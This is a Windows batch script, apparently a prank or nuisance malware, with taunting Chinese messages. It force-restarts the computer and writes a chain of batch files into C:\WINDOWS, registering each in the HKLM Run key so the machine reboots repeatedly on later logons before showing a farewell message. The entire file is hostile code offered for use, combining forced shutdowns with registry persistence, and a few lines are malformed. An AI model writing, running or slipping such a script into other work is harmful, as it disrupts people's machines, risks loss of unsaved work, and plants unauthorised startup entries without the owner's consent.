@echo off
cls
shutdown -c "自动重启5次，别耍花样" -r -f -t 2
echo shutdown -c "还有4次哦，要听话" -r -f -t 5 >C:\WINDOWS\4.bat 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bat /t reg_sz /d c:\windows\4.bat /f
echo shutdown -c "还有3次，坚持" -r -f -t 5 >C:\WINDOWS\3.bat
echo rd c:\windows\4.bat >>C:\WINDOWS\3.bat
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bat /t reg_sz /d c:\windows\3.bat >>c:\windows\4.bat /f
echo shutdown -c "还有2次，你真老实啊" -r -f -t 5 >C:\WINDOWS\2.BAT
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bat /t reg_sz /d c:\windows\2.bat >>c:\windows\3.bat /f
echo shutdown -c "最后1次，好孩子" -r -f -t 5 >C:\WINDOWS\1.bat
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bat /t reg_sz /d c:\windows\1.bat >>c:\windows\2.bat /f
echo @echo off >c:\windows\0.bat
echo cd.. >>c:\windows\0.bat
echo echo. >>c:\windows\0.bat
echo echo. >>c:\windows\0.bat
echo echo 拜拜 帅哥走了 >>c:\windows\0.bat
echo echo. >>c:\windows\0.bat
echo echo. >>c:\windows\0.bat
echo pause >>c:\windows\0.bat
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bat /t reg_sz /d c:\windows\0.bat >>c:\windows\1.bat /f 
end